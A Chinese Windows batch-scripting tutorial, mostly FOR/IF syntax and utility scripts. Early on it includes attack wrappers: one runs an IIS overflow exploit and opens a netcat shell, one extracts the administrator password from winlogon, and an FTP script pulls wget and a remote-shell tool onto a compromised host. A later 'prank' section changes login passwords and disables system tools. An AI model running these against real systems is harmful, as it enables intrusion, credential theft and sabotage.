+<p>FOR &#x2F;F “eol&#x3D;; tokens&#x3D;2,3* delims&#x3D;, “ %i in (myfile.txt) do echo %i %j %k</p>
+<p>按照字母顺序 ijklmnopq依次取参数.</p>
+<p>eol&#x3D;c - 指一个行注释字符的结尾(就一个)</p>
+<p>skip&#x3D;n - 指在文件开始时忽略的行数。</p>
+<p>delims&#x3D;xxx - 指<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%88%86%E9%9A%94%E7%AC%A6">分隔符</a>集。这个替换了空格和跳格键的默认分隔符集。</p>
+<h3 id="处理文件"><a href="#处理文件" class="headerlink" title="处理文件"></a>处理文件</h3><p>echo This is test &gt; a.txt</p>
+<p>type a.txt</p>
+<p>echo This is test 11111 &gt;&gt; a.txt</p>
+<p>type a.txt</p>
+<p>echo This is test 22222 &gt; a.txt</p>
+<p>type a.txt</p>
+<p>第二个echo是追加</p>
+<p>第三个echo将清空a.txt 重新创建 a.txt</p>
+<p>netstat -n | find “3389”</p>
+<p>这个将要列出所有连接3389的用户的ip.</p>
+<p>__________<strong><strong><strong>test<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/.bat">.bat</a></strong></strong></strong></p>
+<p>@echo please care</p>
+<p>echo plese care 1111</p>
+<p>echo plese care 2222</p>
+<p>echo plese care 3333</p>
+<p>@echo please care</p>
+<p>@echo plese care 1111</p>
+<p>@echo plese care 2222</p>
+<p>@echo plese care 3333</p>
+<p>rem 不显示注释语句,本行显示</p>
+<p>@rem 不显示注释语句,本行不显示</p>
+<p>@if exist %windir%\system32[find.exe](<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/find.exe">https://baike.baidu.com/item/find.exe</a>)(echo Find find.exe !!!) else (echo ERROR: Not find find.exe)</p>
+<p>@if exist %windir%\system32\fina.exe (echo Find fina.exe !!!) else (echo ERROR: Not find fina.exe)</p>
+<hr>
+<p>下面我们以具体的一个idahack程序就是ida远程溢出为例子.应该是很简单的.</p>
+<p>______________<em><strong><strong>ida<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/.bat">.bat</a></strong></strong></em></p>
+<p>@rem ver 1.0</p>
+<p>@if NOT exist %windir%\system32\idahack.exe echo “ERROR: dont find idahack.exe”</p>
+<p>@if NOT exist %windir%\system32\nc.exe echo “ERROR: dont find nc.exe”</p>
+<p>@if “%1” &#x3D;&#x3D;”” goto USAGE</p>
+<p>@if NOT “%2” &#x3D;&#x3D;”” goto SP2</p>
+<p>:start</p>
+<p>@echo Now start …</p>
+<p>@ping %1</p>
+<p>@echo chinese win2k:1 sp1:2 sp2:3</p>
+<p>idahack.exe %1 80 1 99 &gt;%temp%_tmp</p>
+<p>@echo “prog exit code [%errorlevel%] idahack.exe”</p>
+<p>@type %temp%_tmp</p>
+<p>@find “good luck :)” %temp%_tmp</p>
+<p>@echo “prog exit code [%errorlevel%] find [goog luck]”</p>
+<p>@if NOT errorlevel 1 nc.exe %1 99</p>
+<p>@goto END</p>
+<p>:SP2</p>
+<p>@idahack.exe %1 80 %2 99 %temp%_tmp</p>
+<p>@type %temp%_tmp</p>
+<p>@find “good luck :)” %temp%_tmp</p>
+<p>@if NOT errorlevel 1 nc.exe %1 99</p>
+<p>@goto END</p>
+<p>:USAGE</p>
+<p>@echo Example: ida<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/.bat">.bat</a>IP</p>
+<p>@echo Example: ida.batIP (2,3)</p>
+<p>:END</p>
+<p>______________<em><strong><strong><strong>ida.bat__END</strong></strong></strong></em></p>
+<p>下面我们再来第二个文件.就是得到administrator的口令.</p>
+<p>大多数人说得不到.其实是自己的没有输入正确的信息.</p>
+<p><em><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>fpass.bat</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em>_________________</p>
+<p>@rem ver 1.0</p>
+<p>@if NOT exist %windir%\system32\findpass.exe echo “ERROR: dont find findpass.exe”</p>
+<p>@if NOT exist %windir%\system32\pulist.exe echo “ERROR: dont find pulist.exe”</p>
+<p>@echo start….</p>
+<p>@echo ____________________________________</p>
+<p>@if “%1”&#x3D;&#x3D;”” goto USAGE</p>
+<p>@findpass.exe %1 %2 %3 &gt;&gt; %temp%_findpass.txt</p>
+<p>@echo “prog exit code [%errorlevel%] findpass.exe”</p>
+<p>@type %temp%_findpass.txt</p>
+<p>@echo ________________________________Here__pass★★★★★★★★</p>
+<p>@ipconfig &#x2F;all &gt;&gt;%temp%_findpass.txt</p>
+<p>@goto END</p>
+<p>:USAGE</p>
+<p>@pulist.exe &gt;%temp%_pass.txt</p>
+<p>@findstr.exe &#x2F;i “WINLOGON explorer internat” %temp%_pass.txt</p>
+<p>@echo “Example: fpass<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/.bat">.bat</a>%1 %2 %3 %4 !!!”</p>
+<p>@echo “Usage: findpass.exe DomainName UserName PID-of-WinLogon”</p>
+<p>:END</p>
+<p>@echo “ fpass.bat%COMPUTERNAME% %USERNAME% administrator “</p>
+<p>@echo “ fpass.batend [%errorlevel%] !”</p>
+<p><em><strong><strong><strong><strong><strong><strong><strong><strong>fpass<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/.bat">.bat</a><em><strong>END</strong></em></strong></strong></strong></strong></strong></strong></strong></strong></em>_______________________________________</p>
+<p>还有一个就是已经通过telnet登陆了一个远程<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA">主机</a>.怎样上传文件(win)</p>
+<p>依次在窗口输入下面的东西. 当然了也可以全部拷贝.Ctrl+V过去. 然后就等待吧!!</p>
+<p>echo open 210.64.x.4 3396&gt;w</p>
+<p>echo read&gt;&gt;w</p>
+<p>echo read&gt;&gt;w</p>
+<p>echo cd winnt&gt;&gt;w</p>
+<p>echo binary&gt;&gt;w</p>
+<p>echo pwd &gt;&gt;w</p>
+<p>echo get wget.exe &gt;&gt;w</p>
+<p>echo get winshell.exe &gt;&gt;w</p>
+<p>echo get any.exe &gt;&gt;w</p>
+<p>echo quit &gt;&gt;w</p>
+<p>ftp -s:w</p>
+<h2 id="语句结构"><a href="#语句结构" class="headerlink" title="语句结构"></a>语句结构</h2><p>类似于C语言，批处理也有它的语句结构。批处理的语句结构主要有<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%80%89%E6%8B%A9%E7%BB%93%E6%9E%84">选择结构</a>(if语句)、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84">循环结构</a>(for语句)等。</p>
+<p>if语句</p>
+<p>if语句实现条件判断，包括字符串比较、存在判断、定义判断等。通过条件判断，if语句即可以实现选择功能。</p>
+<p>1、字符串比较</p>
+<p>if语句仅能够对两个字符(串)是否相同、先后顺序进行判断等。其命令格式为：</p>
+<p>IF [not] string1 compare-op string2 command1 [else command2]</p>
+<p>其中，比较操作符compare-op有以下几类：</p>
+<p>&#x3D;&#x3D; - 等于</p>
+<p>EQU - 等于</p>
+<p>NEQ - 不等于</p>
+<p>LSS - 小于</p>
+<p>LEQ - 小于或等于</p>
+<p>GTR - 大于</p>
+<p>GEQ - 大于或等于</p>
+<p>选择开关&#x2F;i则不区分字符串大小写；选择not项，则对判断结果进行<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%80%BB%E8%BE%91%E9%9D%9E">逻辑非</a>。</p>
+<p>字符串比较示例：</p>
+<p>@echo off</p>
+<p>set str1&#x3D;abcd1233</p>
+<p>set str2&#x3D;ABCD1234</p>
+<p>if %str1%&#x3D;&#x3D;%str2% (echo 字符串相同！) else (echo 字符串不相同！)</p>
+<p>if &#x2F;i %str1% LSS %str2% (echo str1^&lt;str2) else (echo str1^&gt;&#x3D;str2)</p>
+<p>echo.</p>
+<p>set &#x2F;p choice&#x3D;是否显示当前时间？(y&#x2F;n)</p>
+<p>if &#x2F;i not %choice% EQU n echo 当前时间是：%date% %time%</p>
+<p>pause&gt;nul</p>
+<p>对于最后一个if判断，当我们输入n或N时的效果是一样的，都不会显示时间。如果我们取消开关&#x2F;i，则输入N时，依旧会显示时间。</p>
+<p>另外请注意一下几个细节：1-echo str1^&lt;str2和echo str1^&gt;&#x3D;str2；2-echo.。</p>
+<p>2、存在判断</p>
+<p>存在判断的功能是判断文件或文件夹是否存在。其命令格式为：IF [NOT] EXIST filename command1 [else command2]</p>
+<p>@echo off</p>
+<p>if exist %0 echo 文件%0是存在的！</p>
+<p>if not exist %~df0 (</p>
+<p>echo 文件夹%~df0不存在！</p>
+<p>) else echo 文件夹%~df0存在！</p>
+<p>pause&gt;nul</p>
+<p>这里注意几个地方：</p>
+<p>1-存在判断既可以判断文件也可以判断文件夹；</p>
+<p>2-%0即代表该<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86">批处理</a>的全称(包括驱动器盘符、路径、文件名和扩展类型)；</p>
+<p>3-%~df0是对%0的修正，只保留了其驱动器盘符和路径，详情请参考for &#x2F;?，属高级批处理范畴；</p>
+<p>4-注意if语句的多行书写，多行书写要求command1的左括号必须和if在同一行、else必须和command1的右括号同行、command2的左括号必须与else同行、command1和command2都可以有任意多行，即command可以是命令集。</p>
+<p>3、定义判断</p>
+<p>定义判断的功能是判断变量是否存在，即是否已被定义。其命令格式为：</p>
+<p>IF [not] DEFINED variable command1 [else command2]</p>
+<p>存在判断举例：</p>
+<p>@echo off</p>
+<p>set var&#x3D;111</p>
+<p>if defined var (echo var&#x3D;%var%) else echo var尚未定义！</p>
+<p>set var&#x3D;</p>
+<p>if defined var (echo var&#x3D;%var%) else echo var尚未定义！</p>
+<p>pause&gt;nul</p>
+<p>对比可知，”set var&#x3D;”可以取消变量，收回变量所占据的内存空间。</p>
+<p>for语句</p>
+<p>for语句可以实现类似于C语言里面的循环结构，当然for语句的功能要更强大一点，通过不同的开关可以实现更多的功能。for语句有多个开关，不同开关将会实现不同的功能。</p>
+<p><strong>1、无开关</strong></p>
+<p>无开关的for语句能够对设定的范围内进行循环，是最基本的for<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5">循环语句</a>。其命令格式为：</p>
+<p>FOR %%variable IN (set) DO command</p>
+<p>其中，%%variable是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F">批处理程序</a>里面的书写格式，在DOS中书写为%variable，即只有一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%99%BE%E5%88%86%E5%8F%B7">百分号</a>(%)；set就是需要我们设定的循环范围，类似于C语言里面的循环变量；do后面的command就是循环所执行的命令，即循环体。</p>
+<p>无开关for语句举例：</p>
+<p>@echo off</p>
+<p>for %%i in (a,”b c”,d) do echo %%i</p>
+<p>pause&gt;nul</p>
+<p><strong>2、开关&#x2F;L</strong></p>
+<p>含开关&#x2F;L的for语句，可以根据set里面的设置进行循环，从而实现对循环次数的直接控制。其命令格式为：</p>
+<p>FOR &#x2F;L %%variable IN (start,step,end) DO command</p>
+<p>其中，start为开始计数的初始值，step为每次递增的值，end为结束值。当end小于start时，step需要设置为负数。</p>
+<p>含开关&#x2F;L的for语句举例(创建5个文件夹)：</p>
+<p>@echo off</p>
+<p>for &#x2F;l %%i in (1,2,10) do md %%i</p>
+<p>pause</p>
+<p>上例将新建5个文件夹，文件夹名称依次为1、3、5、7、9。可以发现，%%i的结束值并非end的值10，而是不大于end的一个数。</p>
+<p><strong>3、开关&#x2F;F</strong></p>
+<p>含开关&#x2F;F的for语句具有最强大的功能，它能够对字符串进行操作，也能够对命令的返回值进行操作，还可以访问硬盘上的ASCII码文件，比如txt文档等。其命令格式为：</p>
+<p>FOR &#x2F;F [“options”] %%variable IN (set) DO command</p>
+<p>其中，set为(“string”、’command’、file-set)中的一个；options是(eol&#x3D;c、skip&#x3D;n、delims&#x3D;xxx、tokens&#x3D;x,y,m-n、usebackq)中的一个或多个的组合。各选项的意义参见for &#x2F;f。一般情况下，使用较多的是skip、tokens、delims三个选项。</p>
+<p>含开关&#x2F;F的for语句举例：</p>
+<p>@echo off</p>
+<p>echo **No Options:</p>
+<p>for &#x2F;f %%a in (“1,2,10”) do echo a&#x3D;%%a</p>
+<p>echo **Options tokens ^&amp; delims:</p>
+<p>for &#x2F;f “tokens&#x3D;1-3 delims&#x3D;,” %%a in (“1,2,10”) do echo a&#x3D;%%a b&#x3D;%%b c&#x3D;%%c</p>
+<p>pause</p>
+<p>@echo off</p>
+<p>echo 本文件夹里面的文件有：</p>
+<p>for &#x2F;f “skip&#x3D;5 tokens&#x3D;3* “ %%a in (‘dir’) do (</p>
+<p>if not “%%a”&#x3D;&#x3D;”<DIR>“ if not “%%b”&#x3D;&#x3D;”字节” if not “%%b”&#x3D;&#x3D;”可用字节” echo %%b</p>
+<p>)</p>
+<p>pause&gt;nul</p>
+<p>@echo off</p>
+<p>echo 本文件夹里面的文件有：</p>
+<p>dir&gt;c:\file.txt</p>
+<p>for &#x2F;f “skip&#x3D;5 tokens&#x3D;3* “ %%a in (c:\file.txt) do (</p>
+<p>if not “%%a”&#x3D;&#x3D;”<DIR>“ if not “%%b”&#x3D;&#x3D;”字节” if not “%%b”&#x3D;&#x3D;”可用字节” echo %%b</p>
+<p>)</p>
+<p>del c:\file.txt</p>
+<p>pause</p>
+<p>符号<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E4%B8%B2/1017763">字符串</a>中的最后一个字符星号，那么额外的变量将在最后一个符号解析之后分配并接受行的保留文本。本例中也可以改为4，不过文件名中有空格的文件，只能显示空格以前部分。</p>
+<p>同时我们也看到了，for语句的do后面的command也是可以分行的，只需要保证command的左括号和do在同一行就可以了。</p>
+<p><strong>4、开关&#x2F;D或&#x2F;R</strong></p>
+<p>含开关&#x2F;D或&#x2F;R的for语句是与目录或文件有关的命令，一般情况下很少使用。含开关&#x2F;R的命令有时候被用于通过遍历文件夹来查找某一个文件或文件夹，故而列举此例。</p>
+<p>含开关&#x2F;R的for语句举例(文件夹遍历)：</p>
+<p>@echo off</p>
+<p>setlocal enabledelayedexpansion</p>
+<p>FOR &#x2F;R d: %%i IN (.) DO (</p>
+<p>set dd&#x3D;%%i</p>
+<p>set “dd&#x3D;!dd:~0,-1!”</p>
+<p>echo !dd!</p>
+<p>)</p>
+<p>pause</p>
+<p>exit</p>
+<p>上例即可以罗列出D盘下的所有文件夹，其速度要比命令”tree d:”慢多了，不过其返回结果的实用性则远远超过了tree命令。</p>
+<p>一般情况下我们不推荐通过遍历文件夹来查找文件，特别是在查找某些程序(比如QQ.exe)的位置时。推荐通过reg命令查找注册表来查找QQ的路径，以保证查找效率。</p>
+<p>上例中也出现了几个新面孔，如setlocal、感叹号等。其中，感叹号其实就是变量<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%99%BE%E5%88%86%E5%8F%B7">百分号</a>(%)的强化版。之所以要用!而不用%，是因为在for循环中，当一个变量被多次赋值时，%dd%所获取的仅仅是dd第一次被赋予的值；要想刷新dd的值，就必须首先通过命令”setlocal enabledelayedexpansion”来开启延迟变量开关，然后用!dd!来获取dd的值。</p>
+<p>for语句是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86">批处理</a>里面功能最强大、使用最普遍却又最难掌握的一套命令，这也是批处理菜鸟和批处理高手最明显的一个分水岭，一旦掌握了这套命令，那么你就离批处理达人不远了！</p>
+<h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><p>好了，先来几个实用的。</p>
+<p>清理垃圾</p>
+<p>命令代码如下：</p>
+<p>@echo off</p>
+<p>echo 正在清除系统垃圾文件，请稍等……</p>
+<p>del &#x2F;f &#x2F;s &#x2F;q %systemdrive%*.tmp</p>
+<p>del &#x2F;f &#x2F;s &#x2F;q %systemdrive%*._mp</p>
+<p>del &#x2F;f &#x2F;s &#x2F;q %systemdrive%*.log</p>
+<p>del &#x2F;f &#x2F;s &#x2F;q %systemdrive%*.gid</p>
+<p>del &#x2F;f &#x2F;s &#x2F;q %systemdrive%*.chk</p>
+<p>del &#x2F;f &#x2F;s &#x2F;q %systemdrive%*.old</p>
+<p>del &#x2F;f &#x2F;s &#x2F;q %systemdrive%\recycled*.*</p>
+<p>del &#x2F;f &#x2F;s &#x2F;q %windir%*.bak</p>
+<p>del &#x2F;f &#x2F;s &#x2F;q %windir%\prefetch*.*</p>
+<p>rd &#x2F;s &#x2F;q %windir%\temp &amp; md %windir%\temp</p>
+<p>del &#x2F;f &#x2F;q %userprofile%\cookies*.*</p>
+<p>del &#x2F;f &#x2F;q %userprofile%\recent*.*</p>
+<p>del &#x2F;f &#x2F;s &#x2F;q “%userprofile%\Local Settings\Temporary Internet Files*.*”</p>
+<p>del &#x2F;f &#x2F;s &#x2F;q “%userprofile%\Local Settings\Temp*.*”</p>
+<p>del &#x2F;f &#x2F;s &#x2F;q “%userprofile%\recent*.*”</p>
+<p>echo 清除系统垃圾文件完成！</p>
+<p>pause</p>
+<p>网络设置</p>
+<p>@echo off</p>
+<p>::判断<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9C%AC%E5%9C%B0%E8%BF%9E%E6%8E%A5">本地连接</a>赋值a</p>
+<p>for &#x2F;f “tokens&#x3D;3,4 delims&#x3D;&#x3D; “ %%i in (‘ipconfig ^|findstr &#x2F;r “本”‘) do echo %%i %%j &gt;DNS.txt</p>
+<p>for &#x2F;f “tokens&#x3D;1 delims&#x3D;&#x3D;:” %%d in (DNS.txt) do set a&#x3D;%%d</p>
+<p>echo 请根据实际情况更改下面三行</p>
+<p>set slection1&#x3D;</p>
+<p>set&#x2F;p slection1&#x3D;请输入IP地址：</p>
+<p>netsh interface ip set address name&#x3D;”%a%” source&#x3D;static addr&#x3D;%slection1% mask&#x3D;255.255.255.0</p>
+<p>set slection2&#x3D;</p>
+<p>set&#x2F;p slection2&#x3D;请输入网关地址：</p>
+<p>netsh interface ip set address name&#x3D;”%a%” gateway&#x3D;%slection2% gwmetric&#x3D;0</p>
+<p>set slection3&#x3D;</p>
+<p>set&#x2F;p slection3&#x3D;请输入主dns地址</p>
+<p>netsh interface ip set dns name&#x3D;”%a%” source&#x3D;static addr&#x3D;%slection3% register&#x3D;PRIMARY</p>
+<p>set slection4&#x3D;</p>
+<p>set&#x2F;p slection4&#x3D;请输入备份dns地址</p>
+<p>netsh interface ip add dns name&#x3D;”%a%” addr&#x3D;%slection4%</p>
+<p>netsh interface ip set wins name&#x3D;”%a%” source&#x3D;static addr&#x3D;none</p>
+<p>del DNS.txt</p>
+<p>exit 改完IP后可用这个完成本机ARP的绑定：</p>
+<p>@echo off</p>
+<p>if exist ipconfig.txt del ipconfig.txt</p>
+<p>ipconfig &#x2F;all &gt;ipconfig.txt</p>
+<p>if exist phyaddr.txt del phyaddr.txt</p>
+<p>find “Physical Address” ipconfig.txt &gt;phyaddr.txt</p>
+<p>for &#x2F;f “skip&#x3D;2 tokens&#x3D;12” %%M in (phyaddr.txt) do set Mac&#x3D;%%M</p>
+<p>if exist IPAddr.txt del IPaddr.txt</p>
+<p>find “IP Address” ipconfig.txt &gt;IPAddr.txt</p>
+<p>for &#x2F;f “skip&#x3D;2 tokens&#x3D;15” %%I in (IPAddr.txt) do set IP&#x3D;%%I</p>
+<p>arp -s %IP% %Mac%</p>
+<p>del ipaddr.txt</p>
+<p>del ipconfig.txt</p>
+<p>del phyaddr.txt</p>
+<p>exit</p>
+<p>同时修改IP和MAC地址的小代码及制作步骤，用于带着本本到处跑又要改IP的场合！</p>
+<p>1：生成 IP配置文件。</p>
+<p>修改你的IP地址配置为某一个配置，例如配置1。修改好：IP，MASK，DNS，GATE等（主要是IP相关的，不需要修改MAC地址）。</p>
+<p>然后输入：</p>
+<p>netsh -c interface dump&gt; c:\net1.txt</p>
+<p>这里net1.txt就是你生成的IP配置文件了！可以改为其它的文件名，比如：实验室，寝室！</p>
+<p>依次生成所有的网络配置的配置文件，我假设一共生成两个网络配置分别为net1.txt和net2.txt</p>
+<p>2：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%B8%8B%E8%BD%BD%E8%BD%AF%E4%BB%B6">下载软件</a>SMAC为修改MAC地址的小软件仅8K，我已经上传了。</p>
+<p>3：在C盘根目录下建立一个目录，把刚才下载的smac.exe，生成的所有的网络配置文件net1.txt,net2.txt等,等一下要建立的两个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6">批处理文件</a>(bat)也都放要放到这里。我假设为这个目录是：C:\cmd</p>
+<p>4：建立一个批处理文件，假设为：ToNet1<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/.bat">.bat</a>（可以使用记事本编辑，不过注意保存的时候要加上用加上引号的文件名才能保存为ToNet1.bat，否则就是ToNet1.bat.txt）</p>
+<p>输入如下代码：</p>
+<p>smac -modifymac 0 0050BA44D27A</p>
+<p>netsh -f net1.txt</p>
+<p>net1.txt就是你要设置的某一个网络的配置，0050BA44D27A这个要替换为对应这一个网络配置的MAC地址。另外0050BA44D27A前面的0不可以省略，这个表示网卡（你不会有两个或者多个网卡吧？如果你有，请注意自己先试一下看是哪一个网卡了：在这个smac程序的readme中有list功能，你可以判断一下）。</p>
+<p>同样的方法，建立ToNet2<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/.bat">.bat</a>，当然修改网络配置文件为net2.txt和mac地址的属性了。</p>
+<p>把这两个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/bat%E6%96%87%E4%BB%B6">bat文件</a>也放到c:\cmd目录中。</p>
+<p>5：然后你可以建立这两个bat文件的快捷方式，双击一下自动更换了！</p>
+<p>不过请注意，修改MAC地址可能需要重新启动一下网卡比较好（禁用再启用）</p>
+<p>关机</p>
+<p>shutdown -s -t 0</p>
+<p>运行这个后，立刻关机</p>
+<p>想要重启，就把-s改为-r</p>
+<p>锁定注册表</p>
+<p>reg add</p>
+<p>“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\S</p>
+<p>ystem” &#x2F;v DisableRegistryTools &#x2F;t reg_dword &#x2F;d 00000001 &#x2F;f</p>
+<p>解锁注册表</p>
+<p>reg add</p>
+<p>“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\S</p>
+<p>ystem” &#x2F;v DisableRegistryTools &#x2F;t reg_dword &#x2F;d 00000000 &#x2F;f</p>
+<p>start regedit</p>
+<p>显示隐藏文件</p>
+<p>reg add</p>
+<p>“HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced” &#x2F;v</p>
+<p>Hidden &#x2F;t reg_dword &#x2F;d 1 &#x2F;f</p>
+<p>reg add</p>
+<p>“HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced” &#x2F;v</p>
+<p>HideFileExt &#x2F;t reg_dword &#x2F;d 0 &#x2F;f</p>
+<p>reg add</p>
+<p>“HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced” &#x2F;v</p>
+<p>ShowSuperHidden &#x2F;t reg_dword &#x2F;d 1 &#x2F;f</p>
+<p>锁定任务管理器</p>
+<p>REG ADD</p>
+<p>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Sy</p>
+<p>stem &#x2F;V DisableTaskMgr &#x2F;t REG_DWORD &#x2F;d 00000001 &#x2F;f</p>
+<p>解锁任务管理器</p>
+<p>REG ADD</p>
+<p>stem &#x2F;V DisableTaskMgr &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</p>
+<p>解释：这五个都是通过改注册表做到的。</p>
+<p>接下来搞几个用密码的。</p>
+<p>带密码的批处理</p>
+<p>@echo off</p>
+<p>mode con cols&#x3D;30 lines&#x3D;4</p>
+<p>set b&#x3D;5</p>
+<p>:pwd</p>
+<p>title Password</p>
+<p>set &#x2F;a a&#x3D;%a%+1</p>
+<p>set &#x2F;a b&#x3D;%b%-1</p>
+<p>set &#x2F;p pwd&#x3D;Enter Password:</p>
+<p>if &#x2F;I “%pwd%”&#x3D;&#x3D;”Password” goto main</p>
+<p>if &#x2F;I “%a%”&#x3D;&#x3D;”5” goto err</p>
+<p>echo Error %a% times! You have %b% times left now.</p>
+<p>goto pwd</p>
+<p>:err</p>
+<p>color 40</p>
+<p>mode con cols&#x3D;30 lines&#x3D;2</p>
+<p>title Error!</p>
+<p>cls</p>
+<p>echo.</p>
+<p>echo Error 5 times, it will exit!</p>
+<p>ping 127.1 -n 6 &gt;nul</p>
+<p>exit</p>
+<p>:main</p>
+<p>mode con cols&#x3D;30 lines&#x3D;3</p>
+<p>echo Password right!</p>
+<p>pause</p>
+<p>cls</p>
+<p>goto program</p>
+<p>:program</p>
+<p>mode con cols&#x3D;64 lines&#x3D;16</p>
+<p>:: Your program here. ::</p>
+<p>解释：把第九行的Password改成密码。</p>
+<p>锁定<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6/998728">命令提示符</a></p>
+<p>@echo off</p>
+<p>echo.</p>
+<p>echo 正在建立用于锁住命令行窗口的lockcmd.bat批处理文件，请稍侯……</p>
+<p>echo.</p>
+<p>echo. &gt;lockcmd.bat</p>
+<p>echo @echo off &gt;lockcmd.bat</p>
+<p>echo echo. &gt;&gt;lockcmd.bat</p>
+<p>echo setlocal &gt;&gt;lockcmd.bat</p>
+<p>echo set &#x2F;a times&#x3D;3 &gt;&gt;lockcmd.bat</p>
+<p>echo :checkpassword &gt;&gt;lockcmd.bat</p>
+<p>echo set &#x2F;p password&#x3D;请输入密码: &gt;&gt;lockcmd.bat</p>
+<p>echo set &#x2F;a times&#x3D;times-1 &gt;&gt;lockcmd.bat</p>
+<p>echo if “%%password%%”&#x3D;&#x3D;”密码” goto continue &gt;&gt;lockcmd.bat</p>
+<p>echo if “%%times%%”&#x3D;&#x3D;”0” goto exit &gt;&gt;lockcmd.bat</p>
+<p>echo echo 输入的密码不正确，请重新输入，还有%%times%%次机会！</p>
+<p>&gt;&gt;lockcmd.bat</p>
+<p>echo goto checkpassword &gt;&gt;lockcmd.bat</p>
+<p>echo :exit &gt;&gt;lockcmd.bat</p>
+<p>echo echo. &gt;&gt;lockcmd.bat</p>
+<p>echo echo 你无权进入命令行状态！ &gt;&gt;lockcmd.bat</p>
+<p>echo exit &gt;&gt;lockcmd.bat</p>
+<p>echo :continue &gt;&gt;lockcmd.bat</p>
+<p>echo cls &gt;&gt;lockcmd.bat</p>
+<p>echo title 欢迎你回到命令行窗口工作！！！ &gt;&gt;lockcmd.bat</p>
+<p>echo cd &#x2F;d c:\ &gt;&gt;lockcmd.bat</p>
+<p>echo endlocal &gt;&gt;lockcmd.bat</p>
+<p>copy lockcmd.bat %windir%</p>
+<p>echo 正在设置注册表，从而让命令行窗口一打开便进入锁定状态……</p>
+<p>echo Windows Registry Editor Version 5.00 &gt;temp.reg</p>
+<p>echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor]</p>
+<p>&gt;&gt;temp.reg</p>
+<p>echo “AutoRun”&#x3D;”lockcmd.bat” &gt;&gt;temp.reg</p>
+<p>echo 成功锁住命令行，只有输入正确的密码才可使用！</p>
+<p>regedit &#x2F;s temp.reg</p>
+<p>del &#x2F;q &#x2F;f temp.reg &gt;nul</p>
+<p>del &#x2F;q &#x2F;f lockcmd.bat &gt;nul</p>
+<p>pause&gt;nul</p>
+<p>解释：这两个把“密码”改成你要输的密码就行了。</p>
+<p>嗯，接下来是几个整人的。</p>
+<p>2H1Q声明：使用这些代码造成的后果（比如别人找你麻烦）自负。</p>
+<p>首先是个吓唬人的。</p>
+<p>——–为维护网络安全以下代码已删除——-</p>
+<p>修改电脑登录密码</p>
+<p>注意，这个要慎用！！！！！</p>
+<p>@echo off</p>
+<p>set &#x2F;p t&#x3D;请输入您要修改的密码：</p>
+<p>net user 计算机名 %t%</p>
+<p>echo 修改成功！</p>
+<p>在计算机名处写电脑登录时的账号</p>
+<p>比如：net user administrator %t%</p>
+<p>强制关机：</p>
+<p>@Rem 这是使用程序的强制关机，不会征求同意（5秒后关机）</p>
+<p>（rem是一个注释，这一行可用可不用）</p>
+<p>@echo off</p>
+<p>@echo 即将关机</p>
+<p>SET daoTime&#x3D;5</p>
+<p>:dao</p>
+<p>set &#x2F;a daoTime&#x3D;daoTime-1</p>
+<p>ping -n 2 -w 500 127.1&gt;nul</p>
+<p>cls</p>
+<p>echo 关机时间: %daoTime%秒</p>
+<p>if %daoTime%&#x3D;&#x3D;0 (exit) else (goto dao)</p>
+<p>shut down -s -c -t 5</p>
+<p>代码就列举到这里，大家可以自己编一些哦。</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>批处理开发工具</p>
+<p>目前网络上流传有很多,笔者只推荐两个</p>
+<p>1.iBAT</p>
+<p>截至到2014.8.9这个工具仍在更新中,第一印象-简洁!</p>
+<p>2.BatProject+DebugBatch</p>
+<p>这其实是两个工具,不过它们的开发者是同一个人,这两个工具给我的第一印象-强悍!是用来调试错误的上上之选,不过因为它太强大了,尤其是DebugBatch采取了注入到进程当中的方法来调试,可以中途修改变量,暂停执行等,所以杀软会报毒.</p>
+<p>第三方</p>
+<p>纯批处理不是万能的,而系统内置第三方远远满足不了我们的需要(如果你会debug就当我没说吧),因此我们需要各种第三方来使我们的批处理变得更强大,在批处理之家有一个第三方收集帖,里面收集了许多第三方,如果有朋友需要的话可以去那里淘一淘,接下来我介绍几个第三方</p>
